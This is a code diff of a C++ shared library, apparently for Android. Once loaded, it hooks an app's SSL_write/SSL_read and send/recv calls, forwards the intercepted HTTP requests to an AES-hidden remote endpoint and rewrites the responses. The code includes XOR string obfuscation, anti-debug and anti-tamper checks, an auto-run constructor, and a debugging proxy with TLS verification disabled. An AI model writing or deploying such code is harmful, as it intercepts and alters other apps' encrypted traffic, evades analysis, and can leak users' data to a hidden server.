@@ -23,12 +23,18 @@
 #define LOGE(...) 
 #define LOGD(...) 
 
+// ============================================================
+// XOR OBFUSCATION HELPER
+// ============================================================
 static std::string xd(const char* e, size_t l, char k) {
     std::string r;
     for (size_t i = 0; i < l; i++) r += e[i] ^ k;
     return r;
 }
 
+// ============================================================
+// OBFUSCATED STRINGS
+// ============================================================
 static const char _lc[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'c',0x0D^'.',0x0D^'s',0x0D^'o',0};
 static const char _ls[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'s',0x0D^'s',0x0D^'l',0x0D^'.',0x0D^'s',0x0D^'o',0};
 static const char _sw[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'w',0x0D^'r',0x0D^'i',0x0D^'t',0x0D^'e',0};
@@ -39,10 +45,12 @@ static const char _cl[] = {0x0D^'C',0x0D^'o',0x0D^'n',0x0D^'t',0x0D^'e',0x0D^'n'
 static const char _po[] = {0x0D^'P',0x0D^'O',0x0D^'S',0x0D^'T',0};
 static const char _ge[] = {0x0D^'G',0x0D^'E',0x0D^'T',0};
 static const char _cn[] = {0x0D^'c',0x0D^'o',0x0D^'n',0x0D^'n',0x0D^'e',0x0D^'c',0x0D^'t',0};
-static const char _te[] = {0x0D^'T',0x0D^'r',0x0D^'a',0x0D^'n',0x0D^'s',0x0D^'f',0x0D^'e',0x0D^'r',0x0D^'-',0x0D^'E',0x0D^'n',0x0D^'c',0x0D^'o',0x0D^'d',0x0D^'i',0x0D^'n',0x0D^'g',0};
 
 #define S(c) xd(c, sizeof(c)-1, 0x0D)
 
+// ============================================================
+// AES-ENCRYPTED ENDPOINT (AUTO-GENERATED NG encrypt.py)
+// ============================================================
 static const uint8_t _ep[] = { 0x00 };
 static const uint8_t _ak[] = { 0x00 };
 static const uint8_t _iv[] = { 0x00 };
@@ -63,6 +71,9 @@ static std::string _decrypt() {
 }
 static const std::string ENDPOINT = _decrypt();
 
+// ============================================================
+// HTTP STRUCTS
+// ============================================================
 struct HttpRequest {
     std::string method, url, path, host, body;
     std::map<std::string, std::string> headers;
@@ -91,6 +102,9 @@ static std::map<SSL*, ConnState> g_ssl_state;
 static std::map<int, ConnState> g_socket_state;
 static std::mutex g_state_mutex;
 
+// ============================================================
+// ANTI-DEBUG
+// ============================================================
 static bool _debug() {
     std::ifstream st(S("/proc/self/status"));
     std::string l;
@@ -103,6 +117,9 @@ static bool _debug() {
     return false;
 }
 
+// ============================================================
+// ANTI-TAMPER (CRC32)
+// ============================================================
 static uint32_t _crc(const uint8_t* d, size_t l) {
     uint32_t c = 0xFFFFFFFF;
     for(size_t i = 0; i < l; i++) {
@@ -133,6 +150,9 @@ static bool _integrity() {
     return _crc((const uint8_t*)base, sz) == 0xDEADBEEF;
 }
 
+// ============================================================
+// HTTP PARSER
+// ============================================================
 static bool _parse_request(const uint8_t* d, size_t l, HttpRequest& r) {
     std::string s((char*)d, l);
     std::istringstream st(s);
@@ -207,6 +227,9 @@ static bool _parse_response(const uint8_t* d, size_t l, HttpResponse& r) {
     return true;
 }
 
+// ============================================================
+// BUILD MODIFIED RESPONSE
+// ============================================================
 static std::string _build_modified_response(const HttpResponse& orig, const std::string& new_body) {
     std::ostringstream oss;
     oss << "HTTP/1.1 " << orig.status_code << " " << orig.status_message << "\r\n";
@@ -224,6 +247,9 @@ static std::string _build_modified_response(const HttpResponse& orig, const std:
     return oss.str();
 }
 
+// ============================================================
+// FETCH FROM CUSTOM ENDPOINT (WITH PROXY FOR HTTP CANARY)
+// ============================================================
 struct CurlResp { std::string body; int status = 0; bool ok = false; };
 static size_t _cb(void* c, size_t s, size_t n, void* u) {
     CurlResp* r = (CurlResp*)u;
@@ -235,14 +261,23 @@ static CurlResp _fetch(const HttpRequest& req) {
     CurlResp res;
     CURL* curl = curl_easy_init();
     if(!curl) return res;
+    
+    // 🔥 PROXY SETTINGS PARA MAKITA SA HTTP CANARY
+    curl_easy_setopt(curl, CURLOPT_PROXY, "127.0.0.1:8080");
+    curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    
     curl_easy_setopt(curl, CURLOPT_URL, ENDPOINT.c_str());
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, _cb);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
+    
     if(req.method == S("POST")) {
         curl_easy_setopt(curl, CURLOPT_POST, 1L);
         if(!req.body.empty()) curl_easy_setopt(curl, CURLOPT_POSTFIELDS, req.body.c_str());
     }
+    
     struct curl_slist* h = nullptr;
     for(const auto& p : req.headers) {
         if(p.first != S("Host") && p.first != S("Content-Length")) {
@@ -253,6 +288,7 @@ static CurlResp _fetch(const HttpRequest& req) {
     h = curl_slist_append(h, ("X-Original-Method: " + req.method).c_str());
     if(req.is_connect) h = curl_slist_append(h, "X-Is-Connect: true");
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, h);
+    
     if(curl_easy_perform(curl) == CURLE_OK) {
         long code; curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
         res.status = code; res.ok = true;
@@ -262,6 +298,9 @@ static CurlResp _fetch(const HttpRequest& req) {
     return res;
 }
 
+// ============================================================
+// SSL WRITE/READ HOOKS (SIMPLE, WALANG DOBBY)
+// ============================================================
 typedef int (*SSL_write_t)(SSL*, const void*, int);
 typedef int (*SSL_read_t)(SSL*, void*, int);
 static SSL_write_t _ow = nullptr;
@@ -317,6 +356,9 @@ int _my_read(SSL* ssl, void* buf, int num) {
     return res;
 }
 
+// ============================================================
+// SOCKET FALLBACK (KUNG HINDI OPENSSL ANG GAMIT NG APP)
+// ============================================================
 typedef ssize_t (*send_t)(int, const void*, size_t, int);
 typedef ssize_t (*recv_t)(int, void*, size_t, int);
 static send_t _os = nullptr;
@@ -365,6 +407,9 @@ ssize_t _my_recv(int fd, void* buf, size_t len, int flags) {
     return res;
 }
 
+// ============================================================
+// INIT — AWTMATIKONG TATAKBO KAPAG NA-LOAD ANG .so
+// ============================================================
 __attribute__((constructor)) void init() {
     if(_debug()) exit(1);
     if(!_integrity()) { volatile int* p = nullptr; *p = 0; }
